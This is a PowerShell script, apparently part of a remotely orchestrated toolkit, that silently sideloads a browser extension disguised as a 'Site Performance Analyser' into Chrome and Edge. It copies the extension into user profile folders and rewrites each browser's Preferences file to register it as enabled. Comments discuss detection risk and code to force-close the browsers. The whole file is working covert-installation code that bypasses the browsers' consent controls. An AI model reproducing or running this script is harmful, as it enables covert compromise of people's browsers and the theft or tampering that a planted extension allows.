# Sideload-Extension.ps1
# Main script to perform the browser extension sideloading.

# --- Configuration ---
$Global:LogFile = "$env:TEMP\sideload_extension_log.txt" # Make log file path global for functions
$ExtensionName = "Site Performance Analyser" # Must match the "name" in manifest.json
# $ExtensionFolderName is not needed here as path is passed directly

# This will be dynamically replaced by the Sideload-Orchestrator.ps1 script
$RemoteExtensionSourcePath = "PLACEHOLDER_FOR_EXTENSION_PATH"

$ExtensionId = "aabbccddeeffgghhiijjkkllmmnnoopp" # Example - keep consistent
$ChromeUserDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$EdgeUserDataPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"

# --- Functions ---
function Write-Log {
    param([string]$Message)
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $LogEntry = "[$Timestamp] $Message"
    Write-Host $LogEntry # For immediate feedback if window is visible
    Add-Content -Path $Global:LogFile -Value $LogEntry -ErrorAction SilentlyContinue
}

function Sideload-ExtensionToBrowserFromLocal {
    param(
        [string]$BrowserUserDataPath,
        [string]$BrowserName,
        [string]$LocalExtensionSourcePath # This is our $TempExtensionDir
    )
    Write-Log "Attempting to sideload extension to $BrowserName from $LocalExtensionSourcePath"
    if (-not (Test-Path $BrowserUserDataPath)) {
        Write-Log "$BrowserName User Data path not found: $BrowserUserDataPath"; return $false
    }
    if (-not (Test-Path $LocalExtensionSourcePath)) {
        Write-Log "Local extension source path not found: $LocalExtensionSourcePath"; return $false
    }

    # Try multiple common profile directory names
    $ProfileNames = @("Default", "Profile 1", "Profile 2", "Profile 3")
    $ProfilePathFound = $false
    $ProfilePath = $null # Initialise to null

    foreach ($ProfileName in $ProfileNames) {
        $CurrentProfilePath = Join-Path -Path $BrowserUserDataPath -ChildPath $ProfileName
        if (Test-Path $CurrentProfilePath) {
            Write-Log "Found profile path: $CurrentProfilePath"
            $ProfilePath = $CurrentProfilePath
            $ProfilePathFound = $true
            break
        }
    }

    if (-not $ProfilePathFound) {
        Write-Log "$BrowserName: No common profile paths (Default, Profile 1-3) found under $BrowserUserDataPath."
        return $false
    }

    $ExtensionsDir = Join-Path -Path $ProfilePath -ChildPath "Extensions"
    $TargetExtensionPath = Join-Path -Path $ExtensionsDir -ChildPath $ExtensionId
    $VersionFolder = Join-Path -Path $TargetExtensionPath -ChildPath "1.1_0" # Version from manifest + _0

    Write-Log "Target extension installation path: $VersionFolder"

    try {
        if (Test-Path $VersionFolder) {
            Write-Log "Extension folder $VersionFolder already exists. Removing to ensure fresh copy."
            Remove-Item -Path $VersionFolder -Recurse -Force -ErrorAction Stop
        }
        New-Item -Path $VersionFolder -ItemType Directory -Force -ErrorAction Stop | Out-Null
        Copy-Item -Path "$LocalExtensionSourcePath\*" -Destination $VersionFolder -Recurse -Force -ErrorAction Stop
        Write-Log "Extension files copied to $VersionFolder"
    }
    catch { Write-Log "ERROR copying extension files: $($_.Exception.Message)"; return $false }

    $PreferencesFile = Join-Path -Path $ProfilePath -ChildPath "Preferences"
    # $SecurePreferencesFile = Join-Path -Path $ProfilePath -ChildPath "Secure Preferences" # Also important

    if (-not (Test-Path $PreferencesFile)) {
        Write-Log "Preferences file not found: $PreferencesFile"; return $false
    }
    Write-Log "Attempting to modify Preferences file: $PreferencesFile (Browser should ideally be closed)"

    try {
        # Attempt to close browser processes - this is aggressive and might be detected/fail
        # Write-Log "Attempting to close $BrowserName processes..."
        # $ProcessName = if ($BrowserName -eq "Google Chrome") { "chrome" } else { "msedge" }
        # Get-Process -Name $ProcessName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
        # Start-Sleep -Seconds 3 # Give time for processes to close

        $PrefsContent = Get-Content -Path $PreferencesFile -Raw -Encoding UTF8 | ConvertFrom-Json -ErrorAction SilentlyContinue
        if (-not $PrefsContent) { Write-Log "Could not parse Preferences JSON from $PreferencesFile."; return $false }

        if (-not $PrefsContent.extensions) { $PrefsContent | Add-Member -MemberType NoteProperty -Name "extensions" -Value (New-Object PSObject) }
        if (-not $PrefsContent.extensions.settings) { $PrefsContent.extensions | Add-Member -MemberType NoteProperty -Name "settings" -Value (New-Object PSObject) }

        if ($PrefsContent.extensions.settings.PSObject.Properties[$ExtensionId]) {
            $PrefsContent.extensions.settings.PSObject.Properties.Remove($ExtensionId)
            Write-Log "Removed existing preferences for $ExtensionId"
        }
        
        $EscapedTargetExtensionPath = $TargetExtensionPath.Replace('\', '\\') # JSON needs escaped backslashes
        
        $ExtensionSettingsEntry = @{
            path = $EscapedTargetExtensionPath
            manifest = @{ 
                name = $ExtensionName
                version = "1.1" 
            }
            state = 1 
            location = 4 
            was_installed_by_default = $false
            was_installed_by_oem = $false
            install_time = ([long](Get-Date (Get-Date).ToUniversalTime() -UFormat %s) * 1000).ToString() 
        }
        
        $PrefsContent.extensions.settings | Add-Member -MemberType NoteProperty -Name $ExtensionId -Value $ExtensionSettingsEntry -Force
        Write-Log "Added new settings for $ExtensionId to in-memory preferences."

        $PrefsContent | ConvertTo-Json -Depth 100 -Compress | Set-Content -Path $PreferencesFile -Force -Encoding UTF8 -NoNewline -ErrorAction Stop
        Write-Log "Preferences file updated for $BrowserName."
        
        # Secure Preferences handling is very complex and omitted for brevity/reliability in PoC
        return $true
    }
    catch { Write-Log "ERROR modifying Preferences file for $BrowserName: $($_.Exception.Message)"; return $false }
}

# --- Main Logic for Sideload-Extension.ps1 ---
Write-Log "Sideload-Extension.ps1 Started. Source: $RemoteExtensionSourcePath"

if ($RemoteExtensionSourcePath -eq "PLACEHOLDER_FOR_EXTENSION_PATH" -or -not (Test-Path $RemoteExtensionSourcePath)) {
    Write-Log "CRITICAL ERROR: RemoteExtensionSourcePath is not set or invalid: $RemoteExtensionSourcePath"
    exit 1
}

$ChromeSideloaded = $false
$EdgeSideloaded = $false

# Attempt for Chrome
if (Test-Path $ChromeUserDataPath) {
    Write-Log "Attempting Chrome sideload..."
    $ChromeSideloaded = Sideload-ExtensionToBrowserFromLocal -BrowserUserDataPath $ChromeUserDataPath -BrowserName "Google Chrome" -LocalExtensionSourcePath $RemoteExtensionSourcePath
    if ($ChromeSideloaded) { Write-Log "Chrome sideload attempt finished successfully (check browser)." } else { Write-Log "Chrome sideload attempt failed or partially failed."}
} else { Write-Log "Google Chrome User Data path not found."}

# Attempt for Edge
if (Test-Path $EdgeUserDataPath) {
    Write-Log "Attempting Edge sideload..."
    $EdgeSideloaded = Sideload-ExtensionToBrowserFromLocal -BrowserUserDataPath $EdgeUserDataPath -BrowserName "Microsoft Edge" -LocalExtensionSourcePath $RemoteExtensionSourcePath
    if ($EdgeSideloaded) { Write-Log "Edge sideload attempt finished successfully (check browser)." } else { Write-Log "Edge sideload attempt failed or partially failed."}
} else { Write-Log "Microsoft Edge User Data path not found."}

if ($ChromeSideloaded -or $EdgeSideloaded) {
    Write-Log "Sideload-Extension.ps1 Finished. One or more browsers attempted. Browser(s) may need a restart."
} else {
    Write-Log "Sideload-Extension.ps1 Finished. No browsers were successfully targeted or paths not found."
}
